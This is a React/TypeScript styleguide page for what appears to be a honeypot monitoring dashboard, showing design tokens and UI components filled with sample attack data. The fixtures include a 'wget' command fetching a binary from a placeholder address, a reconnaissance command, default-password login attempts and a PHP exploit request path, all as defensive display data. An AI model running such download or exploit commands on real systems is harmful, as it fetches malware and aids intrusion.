import { Inbox, Plus, RefreshCw } from "lucide-react"
import { useState } from "react"
import { AttackerRow } from "@/components/attacker-row"
import { DayBars } from "@/components/charts/day-bars"
import { CountryFlag } from "@/components/country-flag"
import { TERMINAL_BG, TERMINAL_THEME } from "@/components/replay/terminal-theme"
import { SegmentedControl } from "@/components/segmented-control"
import { TopList } from "@/components/top-list"
import { InsightRow } from "@/components/insights/insights-card"
import { CopyDefanged } from "@/components/trends/copy-defanged"
import { NewList } from "@/components/trends/new-list"
import { TagTable } from "@/components/trends/tag-table"
import { EmptyState } from "@/components/empty-state"
import { EventRow } from "@/components/event-row"
import { FilterBar, SensorFilter } from "@/components/filter-bar"
import { FindingCard } from "@/components/finding-card"
import { IPChip } from "@/components/ip-chip"
import { LiveEventRow } from "@/components/live-event-row"
import { LiveIndicator } from "@/components/live-indicator"
import { MaskToggle } from "@/components/mask-toggle"
import { Meter } from "@/components/meter"
import { PageHeader } from "@/components/page-header"
import { SensorBadge } from "@/components/sensor-badge"
import { SensorShare } from "@/components/sensor-share"
import { SessionRow } from "@/components/session-row"
import { SessionStory } from "@/components/session-story"
import { SeverityBadge } from "@/components/severity-badge"
import { SkeletonCard, SkeletonList, SkeletonText, SkeletonTile } from "@/components/skeletons"
import { Sparkline } from "@/components/sparkline"
import { FamilyStrip } from "@/components/family-strip"
import { FamilyTile } from "@/components/family-tile"
import { StatTile } from "@/components/stat-tile"
import { TagBadge } from "@/components/tag-badge"
import { ThemeToggle } from "@/components/theme-toggle"
import { ScannerBadge } from "@/components/scanner-badge"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Checkbox } from "@/components/ui/checkbox"
import { Input } from "@/components/ui/input"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import { Switch } from "@/components/ui/switch"
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Textarea } from "@/components/ui/textarea"
import { Field as FormField, UnsavedHint } from "@/components/form-parts"
import { useTheme } from "@/app/theme"
import { type Attacker, type LiveEvent, type SensorEvent, type Session } from "@/lib/api"
import type { DayPoint } from "@/lib/chart-time"
import type { Insight, NewItem, TagPoint } from "@/lib/trends"
import { contrastRatio, parseHex, readTokenBlock } from "@/lib/contrast"
import { FAMILY_META, SENSOR_FAMILIES, SENSOR_META } from "@/lib/sensors"
import { SEVERITIES } from "@/lib/severity"
import { cn } from "@/lib/utils"
import tokensCss from "@/styles/tokens.css?raw"
import { Section, Specimen } from "./styleguide/parts"
import { featureSections } from "./styleguide/registry"

/* ----------------------------------------------------------------------------
 * Sample data (documentation addresses only).
 * ------------------------------------------------------------------------- */

const minutesAgo = (m: number) => new Date(Date.now() - m * 60_000).toISOString()

function sample(overrides: Partial<Session>): Session {
  return {
    session_id: "sg-1",
    sensor: "ssh",
    src_ip: "203.0.113.9",
    src_port: 51422,
    dst_port: 22,
    started_at: minutesAgo(4),
    ended_at: minutesAgo(3),
    last_event_at: minutesAgo(3),
    event_count: 12,
    login_attempts: 0,
    login_success: false,
    commands: 0,
    downloads: 0,
    http_requests: 0,
    country: "NL",
    city: "Amsterdam",
    asn: 64496,
    org: "Polder Cloud BV",
    abuse_score: 87,
    known_scanner: false,
    tags: [],
    ...overrides,
  }
}

const SESSIONS: Session[] = [
  sample({
    login_attempts: 37,
    commands: 5,
    downloads: 1,
    login_success: true,
    tags: ["crypto-miner"],
  }),
  sample({
    session_id: "sg-2",
    sensor: "telnet",
    src_ip: "198.51.100.23",
    dst_port: 23,
    login_attempts: 12,
    country: "BR",
    org: "Placeholder Fibra",
    started_at: minutesAgo(18),
  }),
  sample({
    session_id: "sg-3",
    sensor: "web",
    src_ip: "192.0.2.14",
    dst_port: 80,
    http_requests: 3,
    tags: ["php2shell"],
    country: "US",
    org: "Example Hosting LLC",
    started_at: minutesAgo(64),
  }),
  sample({
    session_id: "sg-4",
    sensor: "rdp",
    src_ip: "203.0.113.200",
    dst_port: 3389,
    country: null,
    org: null,
    started_at: minutesAgo(190),
  }),
]

let nextId = 1
function ev(type: string, data: Record<string, unknown>, sensor = "ssh", m = 3): SensorEvent {
  return {
    id: nextId++,
    ts: minutesAgo(m),
    sensor,
    session_id: "sg-1",
    type,
    src_ip: "203.0.113.9",
    src_port: 51422,
    dst_port: 22,
    data,
    country: "NL",
    city: null,
    asn: null,
    org: null,
    abuse_score: null,
    known_scanner: null,
    tags: [],
  }
}

const EVENTS: SensorEvent[] = [
  ev("connect", { client_version: "SSH-2.0-libssh_0.9.6" }),
  ev("login_attempt", { username: "root", password: "123456", success: false }),
  ev("login_attempt", { username: "admin", password: "admin", success: true }),
  ev("command", { input: "uname -a; cat /proc/cpuinfo | grep name | wc -l" }),
  ev("download_attempt", { url: "http://198.51.100.7/bins/x86_64", tool: "wget" }),
  ev(
    "http_request",
    { method: "POST", path: "/index.php?PHP_SESSION_UPLOAD_PROGRESS=1", status: 200 },
    "web",
  ),
  ev("scan", {}, "rdp"),
  ev("disconnect", { duration_s: 100 }),
]

function live(id: number, overrides: Partial<LiveEvent>): LiveEvent {
  return {
    id,
    ts: new Date(Date.now() - id * 7_000).toISOString(),
    sensor: "ssh",
    session_id: `sg-live-${id}`,
    type: "login_attempt",
    src_ip: "198.51.100.40",
    src_port: 40022,
    dst_port: 22,
    summary: "login root/123456 failed",
    country: "DE",
    city: null,
    asn: null,
    org: null,
    abuse_score: null,
    known_scanner: null,
    tags: [],
    ...overrides,
  }
}

const LIVE_EVENTS: LiveEvent[] = [
  live(1, { sensor: "telnet", dst_port: 23, summary: "login admin/admin failed", tags: ["recon"] }),
  live(2, {
    sensor: "web",
    type: "http_request",
    dst_port: 80,
    src_ip: "203.0.113.160",
    country: "VN",
    summary: "POST /index.php?PHP_SESSION_UPLOAD_PROGRESS=1 → 200",
    tags: ["php2shell"],
  }),
  live(3, {
    type: "download_attempt",
    summary: "wget http://198.51.100.7/bins/x86_64",
    tags: ["malware-drop"],
  }),
  live(4, { summary: "login pi/raspberry failed", tags: ["malware-drop"] }),
  live(5, {
    sensor: "rdp",
    dst_port: 3389,
    src_ip: "192.0.2.24",
    country: null,
    summary: "RDP connect",
  }),
]

/** Last-minute counts for the FamilyTile specimens (Live page). */
const SAMPLE_LIVE: Record<string, { events: number; sessions: number }> = {
  ssh: { events: 40, sessions: 8 },
  telnet: { events: 17, sessions: 5 },
  adb: { events: 0, sessions: 0 },
  web: { events: 29, sessions: 11 },
  docker: { events: 6, sessions: 2 },
  redis: { events: 14, sessions: 4 },
  mysql: { events: 9, sessions: 3 },
  mssql: { events: 3, sessions: 1 },
  rdp: { events: 4, sessions: 2 },
  smb: { events: 22, sessions: 13 },
  sip: { events: 2, sessions: 1 },
  synology: { events: 8, sessions: 2 },
}

const HOUR = 3_600_000
const SAMPLE_DAYS: DayPoint[] = Array.from({ length: 14 }, (_, i) => ({
  day: new Date(Date.now() - (13 - i) * 24 * HOUR).toISOString().slice(0, 10),
  events: [0, 4, 0, 12, 8, 0, 0, 22, 15, 9, 0, 31, 18, 64][i] ?? 0,
}))
const SAMPLE_ATTACKER: Attacker = {
  ip: "203.0.113.77",
  first_seen: new Date(Date.now() - 7 * 24 * HOUR).toISOString(),
  last_seen: new Date(Date.now() - 23 * 60_000).toISOString(),
  sessions: 30,
  events: 696,
  sensors: ["ssh", "telnet", "web"],
  login_attempts: 485,
  login_success: 4,
  commands: 29,
  downloads: 1,
  country: "CN",
  city: "Shenzhen",
  asn: 64498,
  org: "Sample Telecom",
  abuse_score: 87,
  known_scanner: false,
  tags: ["mirai"],
}
const SAMPLE_INSIGHTS: Insight[] = [
  {
    id: "i1",
    kind: "exploit",
    severity: "severe",
    sentence: "PHP2Shell exploit attempts tripled since Tuesday (412 vs 131).",
    evidence: { metric: "events", current: 412, previous: 131, ratio: 3.1 },
    link: "/attacks?tag=php2shell",
  },
  {
    id: "i2",
    kind: "campaign",
    severity: "warning",
    sentence: "One network, AS64500 (Example Hosting), sent 38% of all SSH sessions this week.",
    evidence: { metric: "sessions", current: 38, previous: 9, ratio: 4.2 },
    link: "/attacks?asn=64500",
  },
  {
    id: "i3",
    kind: "new_value",
    severity: "info",
    sentence: '14 passwords were tried for the first time this week, led by "Summer2026!".',
    evidence: { metric: "values", current: 14, previous: 0, ratio: 0 },
    link: "/trends",
  },
]
const SAMPLE_TAGS: TagPoint[] = Array.from({ length: 7 }, (_, i) => ({
  ts: new Date(Date.now() - (6 - i) * 24 * HOUR).toISOString(),
  tags: {
    php2shell: 20 + i * 18,
    recon: 40 - i * 2,
    "brute-force": 30,
    "malware-drop": 10 + i,
    "crypto-miner": 12,
    other: 8,
  },
}))
const SAMPLE_NEW: NewItem[] = [
  { value: "svc_backup", count: 103, first_seen: new Date(Date.now() - 12 * HOUR).toISOString() },
  { value: "deploy-bot", count: 74, first_seen: new Date(Date.now() - 72 * HOUR).toISOString() },
]
const TERMINAL_COLOURS = [
  "foreground",
  "red",
  "green",
  "yellow",
  "blue",
  "magenta",
  "cyan",
  "white",
  "black",
] as const

/* ----------------------------------------------------------------------------
 * Layout helpers
 * ------------------------------------------------------------------------- */

/** Token values come straight from tokens.css, so this page cannot drift from it. */
const THEME_TOKENS = {
  dark: readTokenBlock(tokensCss, ':root,\n[data-theme="dark"]'),
  light: readTokenBlock(tokensCss, '[data-theme="light"] {'),
}

function useTokens(): Record<string, string> {
  return THEME_TOKENS[useTheme().resolved]
}

function ratio(a?: string, b?: string): string {
  if (!a || !b) return "–"
  try {
    return contrastRatio(parseHex(a), parseHex(b)).toFixed(1)
  } catch {
    return "–"
  }
}

const SURFACE_TOKENS = [
  "bg",
  "surface",
  "surface-raised",
  "surface-hover",
  "border",
  "border-strong",
] as const
const TEXT_TOKENS = ["fg", "fg-muted", "fg-subtle"] as const

function Swatch({ name, value, onSurface }: { name: string; value?: string; onSurface?: string }) {
  return (
    <div className="min-w-0">
      <div className="h-14 rounded-md border" style={{ background: `var(--${name})` }} />
      <div className="mt-2 truncate font-mono text-xs text-fg">--{name}</div>
      <div className="flex justify-between gap-2 font-mono text-2xs text-fg-subtle">
        <span>{value ?? ""}</span>
        {onSurface ? <span>{ratio(value, onSurface)}:1</span> : null}
      </div>
    </div>
  )
}

/* ----------------------------------------------------------------------------
 * Page
 * ------------------------------------------------------------------------- */

/* The type roles of index.css, in the order a page uses them. */
const TYPE_ROLES = [
  ["type-figure", "type-figure", "28/34, 36/42 from sm · 600", "headline figures", "18,342"],
  ["type-kpi", "type-kpi", "28/34 · 600", "KPI values", "1,260 sessions"],
  ["type-page-title", "type-page-title", "22/28 · 600", "page title (h1)", "Attacks"],
  ["type-section-title", "type-section-title", "18/26 · 600", "section, dialog, sheet", "Entries"],
  [
    "type-card-title",
    "type-card-title",
    "14/22 · 500",
    "card title, finding",
    "PHP exploit attempts tripled since Tuesday.",
  ],
  ["type-lede", "type-lede", "14/22 · 400", "page sentence", "380 sessions from 265 addresses."],
  ["type-subtitle", "type-subtitle", "13/20 · 500", "heading inside a card", "Recent sessions"],
  [
    "text-sm",
    "text-sm",
    "13/20 · 400",
    "body, table text",
    "203.0.113.9 tried 37 SSH passwords, then ran 5 commands.",
  ],
  [
    "type-eyebrow text-fg-muted",
    "type-eyebrow",
    "12/18 · 500",
    "card label, KPI label",
    "Activity by sensor",
  ],
  [
    "text-xs text-fg-muted",
    "text-xs",
    "12/18 · 400",
    "meta, hints, sm controls",
    "Started 4 min ago",
  ],
  ["type-column text-fg-subtle", "type-column", "11/16 · 500 · caps", "column labels", "Last seen"],
  [
    "font-mono text-xs",
    "font-mono",
    "12/18 · 400",
    "addresses, commands",
    "wget http://198.51.100.7/bins/x86_64",
  ],
] as const

const TOC = [
  ["colour", "Colour"],
  ["sensors", "Sensors"],
  ["severity", "Severity"],
  ["type", "Type"],
  ["space", "Space & shape"],
  ["motion", "Motion"],
  ["components", "Components"],
  ["data", "Data display"],
  ["charts", "Charts"],
  ["trends", "Trends"],
  ["states", "States"],
] as const

export function StyleguidePage() {
  const tokens = useTokens()
  const [feed, setFeed] = useState<SensorEvent[]>(() => EVENTS.slice(0, 3))
  const [counter, setCounter] = useState(18_342)
  const [newestId, setNewestId] = useState<number | null>(null)
  const [sort, setSort] = useState("last_seen")
  const [speed, setSpeed] = useState("1")

  const addEvent = () => {
    const template = EVENTS[nextId % EVENTS.length]
    if (!template) return
    const e = { ...template, id: nextId++, ts: new Date().toISOString() }
    setNewestId(e.id)
    setFeed((f) => [e, ...f].slice(0, 5))
  }

  return (
    <>
      <PageHeader
        help="styleguide"
        title="Styleguide"
        description="Every token and base component, in every state. This page is what the visual review screenshots."
        actions={<ThemeToggle />}
      />

      <nav aria-label="Sections" className="-mx-1 mb-4 flex flex-wrap gap-1">
        {TOC.map(([id, label]) => (
          <a
            key={id}
            href={`#${id}`}
            className="rounded-md px-2 py-1 text-xs font-medium text-fg-muted transition-colors hover:bg-surface-hover hover:text-fg"
          >
            {label}
          </a>
        ))}
        {featureSections.map(({ id, label }) => (
          <a
            key={id}
            href={`#${id}`}
            className="rounded-md px-2 py-1 text-xs font-medium text-fg-muted transition-colors hover:bg-surface-hover hover:text-fg"
          >
            {label}
          </a>
        ))}
      </nav>

      <Section
        id="colour"
        title="Colour"
        description="Neutral, slightly cool surfaces. Hue is reserved for meaning: one per sensor, and a severity scale where only 'severe' is red. Ratios are WCAG contrast against --surface."
      >
        <div className="grid grid-cols-2 gap-4 sm:grid-cols-3 lg:grid-cols-6">
          {SURFACE_TOKENS.map((n) => (
            <Swatch key={n} name={n} value={tokens[n]} />
          ))}
        </div>
        <div className="mt-6 grid grid-cols-1 gap-3 sm:grid-cols-3">
          {TEXT_TOKENS.map((n) => (
            <div key={n} className="rounded-lg border bg-surface p-4">
              <p className="text-base" style={{ color: `var(--${n})` }}>
                The quick attacker tried 37 passwords.
              </p>
              <p className="mt-2 flex justify-between font-mono text-2xs text-fg-subtle">
                <span>
                  --{n} {tokens[n]}
                </span>
                <span>{ratio(tokens[n], tokens.surface)}:1</span>
              </p>
            </div>
          ))}
        </div>
      </Section>

      <Section
        id="sensors"
        title="Sensors"
        description="Twelve sensors, four families, one hue per family (Okabe-Ito, colour-blind safe). Inside a family, sensors are told apart by their icon and their name, which are always shown: meaning never rests on colour alone."
      >
        <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">
          {SENSOR_FAMILIES.map((f) => {
            const fam = FAMILY_META[f]
            return (
              <div key={f} className="overflow-hidden rounded-lg border bg-surface shadow-sm">
                <div className={cn("h-1.5", fam.fill)} />
                <div className="space-y-1 p-4 pb-3">
                  <p className={cn("flex items-center gap-2 text-sm font-medium", fam.text)}>
                    <span aria-hidden className={cn("size-2 rounded-full", fam.fill)} />
                    {fam.label}
                  </p>
                  <p className="text-xs text-fg-muted">{fam.description}</p>
                  <p className="flex justify-between font-mono text-2xs text-fg-subtle">
                    <span>
                      --family-{f} {tokens[`family-${f}`]}
                    </span>
                    <span>{ratio(tokens[`family-${f}`], tokens.surface)}:1</span>
                  </p>
                </div>
                <ul className="divide-y border-t">
                  {fam.sensors.map((s) => {
                    const meta = SENSOR_META[s]
                    return (
                      <li key={s} className="space-y-1.5 px-4 py-3">
                        <div className="flex items-center justify-between gap-2">
                          <SensorBadge sensor={s} />
                          <span className="font-mono text-2xs text-fg-subtle">
                            {meta.transport}/{meta.port}
                          </span>
                        </div>
                        <p className="text-xs text-fg-muted">{meta.description}</p>
                        <p className="flex items-center justify-between gap-2 font-mono text-2xs text-fg-subtle">
                          <span className="inline-flex items-center gap-1.5">
                            <span
                              aria-hidden
                              className="size-2.5 rounded-[2px]"
                              style={{ backgroundColor: meta.shadeVar }}
                            />
                            chart shade {tokens[`sensor-${s}`]}
                          </span>
                          <span>{ratio(tokens[`sensor-${s}`], tokens.surface)}:1</span>
                        </p>
                      </li>
                    )
                  })}
                </ul>
              </div>
            )
          })}
        </div>
        <p className="mt-4 max-w-3xl text-xs text-fg-muted">
          Badges, dots, map arcs and the default charts use the family hue (AA as text, on its tint
          too). The per-sensor shades are fills for the &ldquo;Sensors&rdquo; chart split only,
          never text (3:1 or more on the surface). Stacks always run in registry order, so a family
          stays one block of its hue.
        </p>
        <div className="mt-4 grid grid-cols-1 gap-4 lg:grid-cols-3">
          <FindingCard
            className="lg:col-span-2"
            eyebrow="Sensor share by family (sample)"
            finding="Remote shells took 58% of all sessions, most of them on SSH."
            detail="Stacked bar + labelled legend: the numbers carry the meaning, colour helps."
          >
            <SensorShare
              shares={[
                { id: "ssh", value: 910 },
                { id: "telnet", value: 188 },
                { id: "adb", value: 36 },
                { id: "web", value: 121 },
                { id: "docker", value: 44 },
                { id: "redis", value: 162 },
                { id: "mysql", value: 97 },
                { id: "mssql", value: 58 },
                { id: "rdp", value: 41 },
                { id: "smb", value: 302 },
                { id: "sip", value: 0 },
                { id: "synology", value: 74 },
              ]}
            />
          </FindingCard>
          <Specimen label="SensorFilter: multi-select, grouped by family, URL-synced (?sensor=a,b)">
            <SensorFilter />
          </Specimen>
        </div>
      </Section>

      <Section
        id="severity"
        title="Severity"
        description="Four steps, each with its own icon. Red means severe only: malware dropped or an exploit payload sent."
      >
        <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-4">
          {SEVERITIES.map((s) => (
            <Specimen key={s} label={s}>
              <SeverityBadge severity={s} />
              <SeverityBadge severity={s} iconOnly />
              <span className="ml-auto font-mono text-2xs text-fg-subtle">
                {ratio(tokens[`sev-${s}`], tokens.surface)}:1
              </span>
            </Specimen>
          ))}
        </div>
        <p className="mt-4 max-w-2xl text-xs text-fg-muted">
          Info: connected or probed. Notice: tried credentials or sent requests. Warning: got a
          shell or ran commands. Severe: download attempt, malware tag or exploit payload.
        </p>
      </Section>

      <Section
        id="type"
        title="Type"
        description="Inter for text, JetBrains Mono for addresses, commands and hashes. Tabular figures everywhere so numbers line up. Titles and figures use a role, never a raw size, so a card title is the same size on every page."
      >
        <div className="divide-y rounded-lg border bg-surface shadow-sm">
          {TYPE_ROLES.map(([cls, name, meta, use, text]) => (
            <div
              key={name}
              className="grid grid-cols-1 gap-x-6 gap-y-1 px-4 py-3 sm:px-5 md:grid-cols-[15rem_minmax(0,1fr)] md:items-baseline"
            >
              <div className="min-w-0">
                <p className="font-mono text-xs text-fg">{name}</p>
                <p className="text-xs text-fg-subtle">
                  {meta} · {use}
                </p>
              </div>
              <span className={cn("min-w-0 truncate text-fg", cls)}>{text}</span>
            </div>
          ))}
        </div>
      </Section>

      <Section
        id="space"
        title="Space & shape"
        description="A 4 px grid, three control heights, one chip height and three radii. Dark elevation is a border plus a faint top highlight; light adds a soft shadow."
      >
        <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">
          <Specimen label="Control heights: sm 32 (rows, filters), default 36 (forms), lg 40 (one page action). 40 on touch.">
            <div className="flex w-full flex-col gap-3">
              {(
                [
                  ["sm", "32"],
                  ["default", "36"],
                  ["lg", "40"],
                ] as const
              ).map(([size, px]) => (
                <div key={size} className="flex flex-wrap items-center gap-2">
                  <span className="w-16 font-mono text-xs text-fg-subtle">{px} px</span>
                  <Button size={size}>Primary</Button>
                  <Button size={size} variant="outline">
                    <Plus aria-hidden /> Outline
                  </Button>
                  <Input
                    size={size}
                    aria-label={`Sample ${size} input`}
                    placeholder="Search"
                    className="w-32"
                  />
                </div>
              ))}
            </div>
          </Specimen>
          <Specimen label="One row, one baseline: every control in a filter bar is sm">
            <SensorFilter />
            <SegmentedControl
              label="Window"
              value={sort}
              onChange={setSort}
              options={[
                { value: "last_seen", label: "24 h" },
                { value: "sessions", label: "7 days" },
                { value: "events", label: "30 days" },
              ]}
            />
            <Input size="sm" aria-label="Sample search" placeholder="IP prefix" className="w-36" />
            <Button variant="outline" size="sm">
              Export
            </Button>
          </Specimen>
          <Specimen label="Chips are 22 px, icons 14 px, sans 12 px or mono 11 px">
            <SensorBadge sensor="ssh" />
            <SeverityBadge severity="warning" />
            <TagBadge tag="crypto-miner" />
            <IPChip ip="203.0.113.9" />
            <ScannerBadge />
            <Badge variant="outline">Outline</Badge>
          </Specimen>
          <Specimen label="Icons: 14 px next to 12 px text, 16 px in controls and next to 13 to 14 px text, 20 px in empty states">
            {([14, 16, 20] as const).map((n) => (
              <span
                key={n}
                className="inline-flex items-center gap-1.5 font-mono text-xs text-fg-subtle"
              >
                <Inbox aria-hidden style={{ width: n, height: n }} className="text-fg" />
                {n}
              </span>
            ))}
          </Specimen>
          <Specimen label="Spacing (4 px grid): 16 px between cards, 16 / 20 px inside, 24 px or more between sections">
            <div className="flex items-end gap-2">
              {[1, 2, 3, 4, 5, 6, 8, 10, 12].map((n) => (
                <div key={n} className="flex flex-col items-center gap-1.5">
                  <div className="w-3 rounded-xs bg-fg-subtle" style={{ height: n * 4 }} />
                  <span className="font-mono text-2xs text-fg-subtle">{n * 4}</span>
                </div>
              ))}
            </div>
          </Specimen>
          <Specimen label="Radius: 6 chips, 8 controls, 12 cards (selfhostr plate, button, card)">
            {(
              [
                ["rounded-xs", "4"],
                ["rounded-sm", "6"],
                ["rounded-md", "8"],
                ["rounded-lg", "12"],
                ["rounded-full", "full"],
              ] as const
            ).map(([cls, label]) => (
              <div key={cls} className="flex flex-col items-center gap-1.5">
                <div className={cn("size-10 border border-border-strong bg-surface-hover", cls)} />
                <span className="font-mono text-2xs text-fg-subtle">{label}</span>
              </div>
            ))}
          </Specimen>
          <Specimen label="Elevation" className="lg:col-span-2">
            {(["shadow-sm", "shadow-md", "shadow-lg"] as const).map((cls) => (
              <div
                key={cls}
                className={cn(
                  "flex h-14 w-20 items-end rounded-lg border bg-surface-raised p-2 font-mono text-2xs text-fg-subtle",
                  cls,
                )}
              >
                {cls.replace("shadow-", "")}
              </div>
            ))}
          </Specimen>
        </div>
      </Section>

      <Section
        id="motion"
        title="Motion"
        description="Calm: 150–250 ms, ease-out. New feed items slide in, counters tween. Nothing flashes. With reduced motion, changes are instant."
      >
        <div className="grid grid-cols-1 gap-4 lg:grid-cols-3">
          <FindingCard
            className="lg:col-span-2"
            eyebrow="Feed item slide-in"
            finding="New events slide in at the top."
            action={
              <Button variant="outline" size="sm" onClick={addEvent}>
                <Plus aria-hidden /> Add event
              </Button>
            }
            bodyClassName="px-0 sm:px-0 pb-2 sm:pb-2"
          >
            <ol className="divide-y border-t">
              {feed.map((e) => (
                <li key={e.id}>
                  <EventRow event={e} time="relative" showSensor accent isNew={e.id === newestId} />
                </li>
              ))}
            </ol>
          </FindingCard>
          <StatTile
            label="Events, 24 h"
            value={counter}
            hint="Click to tween the number"
            sparkline={
              <Button
                variant="outline"
                size="sm"
                className="w-full"
                onClick={() => setCounter((c) => c + 37 + ((c * 7) % 400))}
              >
                <RefreshCw aria-hidden /> Bump counter
              </Button>
            }
          />
        </div>
      </Section>

      <Section
        id="components"
        title="Components"
        description="shadcn/ui primitives restyled through tokens, plus the SuckerPot building blocks."
      >
        <div className="grid grid-cols-1 gap-4 lg:grid-flow-row-dense lg:grid-cols-2">
          <Specimen label="Button: one primary per view, neutral, never a hue">
            <Button>Primary</Button>
            <Button variant="outline">Outline</Button>
            <Button variant="secondary">Secondary</Button>
            <Button variant="ghost">Ghost</Button>
            <Button variant="outline" size="icon" aria-label="Refresh">
              <RefreshCw aria-hidden />
            </Button>
            <Button disabled>Disabled</Button>
          </Specimen>
          <Specimen
            label="Form: label 13/500, control 36 px, hint 12 px, Save at the same height"
            className="lg:col-span-2"
          >
            <form className="grid w-full gap-4 sm:grid-cols-2" onSubmit={(e) => e.preventDefault()}>
              <FormField id="sg-name" label="Mailbox" hint="Where the replies arrive.">
                <Input id="sg-name" placeholder="abuse@example.org" />
              </FormField>
              <FormField id="sg-mode" label="Send" optional>
                <Select defaultValue="digest">
                  <SelectTrigger id="sg-mode" className="w-full">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="digest">Once a day</SelectItem>
                    <SelectItem value="now">Right away</SelectItem>
                  </SelectContent>
                </Select>
              </FormField>
              <div className="sm:col-span-2">
                <FormField id="sg-note" label="Note">
                  <Textarea id="sg-note" placeholder="Shown at the top of every report." />
                </FormField>
              </div>
              <label className="flex items-center gap-2 text-sm text-fg">
                <Switch defaultChecked aria-label="Send automatically" /> Send automatically
              </label>
              <label className="flex items-center gap-2 text-sm text-fg">
                <Checkbox defaultChecked /> Include the evidence
              </label>
              <div className="flex items-center gap-3 sm:col-span-2">
                <Button type="submit">Save</Button>
                <UnsavedHint show />
              </div>
            </form>
          </Specimen>
          <Specimen label="Tabs (Settings sections): one strip, the open tab underlined">
            <Tabs defaultValue="general" className="w-full">
              <TabsList variant="line" className="max-w-full justify-start overflow-x-auto">
                {["General", "Keys", "Users", "Alert channels"].map((t) => (
                  <TabsTrigger key={t} value={t.toLowerCase()} className="flex-none px-3">
                    {t}
                  </TabsTrigger>
                ))}
              </TabsList>
            </Tabs>
          </Specimen>
          <Specimen label="TagBadge (neutral · warning triangle · severe diamond)">
            <TagBadge tag="recon" />
            <TagBadge tag="db-ransom" />
            <TagBadge tag="sip-fraud" />
            <TagBadge tag="eternalblue" />
            <TagBadge tag="synology-exploit" />
            <TagBadge tag="c3rb3r" />
            <TagBadge tag="scanner" />
            <TagBadge tag="php2shell" />
            <TagBadge tag="crypto-miner" />
            <TagBadge tag="mirai" href={null} />
          </Specimen>
          <Specimen label="IPChip">
            <IPChip ip="203.0.113.9" />
            <IPChip ip="2001:db8::42" />
            <IPChip ip="198.51.100.23" masked />
            <IPChip ip="192.0.2.14" copyable={false} href={null} />
          </Specimen>
          <Specimen label="CountryFlag">
            <CountryFlag code="CH" />
            <CountryFlag code="NL" />
            <CountryFlag code="BR" />
            <CountryFlag code="JP" showName />
            <CountryFlag code="ZZ" showName />
            <CountryFlag code={null} showName />
          </Specimen>
          <Specimen label="LiveIndicator">
            <LiveIndicator status="live" />
            <LiveIndicator status="connecting" />
            <LiveIndicator status="reconnecting" />
            <LiveIndicator status="offline" />
          </Specimen>
          <Specimen label="ThemeToggle">
            <ThemeToggle />
          </Specimen>
          <Specimen label="Meter (quota and disk; warning from 80 %, severe only when critical)">
            <div className="w-full space-y-3">
              <Meter value={312} max={1000} label="Quota, neutral" valueText="312 of 1,000" />
              <Meter
                value={870}
                max={1000}
                label="Quota, warning"
                valueText="870 of 1,000"
                tone="warning"
              />
              <Meter value={97} max={100} label="Disk, critical" valueText="97%" tone="severe" />
            </div>
          </Specimen>
          <Specimen label="MaskToggle (screenshot mode, also ?mask=1)" className="lg:col-span-2">
            <MaskToggle className="w-full max-w-56" />
            <IPChip ip="203.0.113.77" />
            <span className="font-mono text-xs text-fg-muted">→ masked: 203.0.x.x</span>
          </Specimen>
          <div className="lg:col-span-2">
            <Specimen label="FilterBar (URL-synced: try it, then look at the address bar)">
              <FilterBar
                chips={[
                  {
                    param: "src_ip",
                    label: "IP",
                    render: (v) => <span className="font-mono">{v}</span>,
                  },
                ]}
                alsoClears={["sensor"]}
              >
                <SensorFilter />
              </FilterBar>
            </Specimen>
          </div>
        </div>
      </Section>

      <Section
        id="data"
        title="Data display"
        description="KPIs, finding cards, session stories and event rows: the vocabulary every page is built from."
      >
        <div className="grid grid-cols-2 gap-3 sm:gap-4 lg:grid-cols-4">
          <StatTile label="Attacks, 24 h" value={1260} delta={0.18} />
          <StatTile label="Unique IPs" value={417} delta={-0.06} />
          <StatTile
            label="SSH sessions"
            value={910}
            hint="Last 24 h"
            sparkline={
              <Sparkline
                label="SSH sessions per hour, last 24 hours"
                color="var(--family-shell)"
                values={[
                  12, 18, 15, 22, 30, 28, 25, 40, 38, 52, 47, 44, 39, 35, 41, 49, 60, 55, 48, 42,
                  37, 33, 29, 31,
                ]}
              />
            }
          />
          <StatTile label="Malware attempts" value={14} delta={0} />
        </div>

        <div className="mt-4 grid grid-cols-1 gap-4 lg:grid-cols-2">
          <FindingCard
            eyebrow="Finding card"
            finding="PHP exploit attempts tripled since Tuesday."
            detail="Every card opens with the sentence its chart proves."
            footer="Source: web sensor, last 7 days"
          >
            <Sparkline
              label="PHP exploit attempts per day"
              color="var(--family-web)"
              values={[3, 4, 2, 5, 9, 12, 14]}
              className="h-24"
            />
          </FindingCard>
          <div className="rounded-lg border bg-surface shadow-sm">
            <div className="border-b px-4 py-2 font-mono text-2xs text-fg-subtle sm:px-5">
              SessionStory (block)
            </div>
            <div className="space-y-4 p-4 sm:p-5">
              {SESSIONS.map((s) => (
                <SessionStory key={s.session_id} session={s} layout="block" />
              ))}
            </div>
          </div>
        </div>

        <div className="mt-4 grid grid-cols-2 gap-3 sm:gap-4 lg:grid-cols-4">
          {SENSOR_FAMILIES.map((f) => (
            <FamilyTile
              key={f}
              family={f}
              bySensor={SAMPLE_LIVE}
              unit="events / min"
              unitShort="/ min"
            />
          ))}
        </div>

        <div className="mt-4 space-y-3 rounded-lg border bg-surface p-4 shadow-sm sm:p-5">
          <p className="font-mono text-2xs text-fg-subtle">
            FamilyStrip (Live: overlay on the map, grid under it on narrow cards; a family toggles
            the page filter)
          </p>
          <FamilyStrip bySensor={SAMPLE_LIVE} className="w-fit max-w-full overflow-x-auto" />
          <FamilyStrip bySensor={SAMPLE_LIVE} layout="grid" />
        </div>

        <div className="mt-4 overflow-hidden rounded-lg border bg-surface shadow-sm">
          <div className="border-b px-4 py-2 font-mono text-2xs text-fg-subtle sm:px-5">
            LiveEventRow (red icon only for a download or an exploit request, never for a whole
            tagged session)
          </div>
          <div role="list" aria-label="Live event samples">
            {LIVE_EVENTS.map((e, i) => (
              <div key={e.id} role="listitem" className={cn(i > 0 && "border-t")}>
                <LiveEventRow event={e} />
              </div>
            ))}
          </div>
